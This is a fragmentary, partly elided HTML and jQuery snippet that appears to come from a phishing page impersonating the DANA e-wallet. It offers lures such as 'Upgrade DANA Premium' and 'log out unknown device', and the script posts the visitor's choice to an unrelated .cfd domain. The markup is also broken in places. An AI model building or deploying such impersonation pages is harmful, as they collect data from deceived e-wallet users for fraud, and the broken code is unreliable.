...
.s:active{
 ...
 <center>
       <label class="aha">
       <input type="radio" id="btn1" name="tarif" value="𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝗗𝗔𝗡𝗔 𝗣𝗿𝗲𝗺𝗶𝘂𝗺" onclick="letsgo1()"/>
    <span class="s">𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝗗𝗔𝗡𝗔 𝗣𝗿𝗲𝗺𝗶𝘂𝗺</span>
		</label>
  <label class="aha">
   ...
   <label class="aha">
   <input type="radio" id="btn3" name="tarif" value="𝗟𝗼𝗴 𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹" onclick="letsgo1()">
   <sp class="s">𝗟𝗼𝗴 𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹</span>
   </label>
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://ww-zbi.cfd/fd0d/ii/tarif.php',
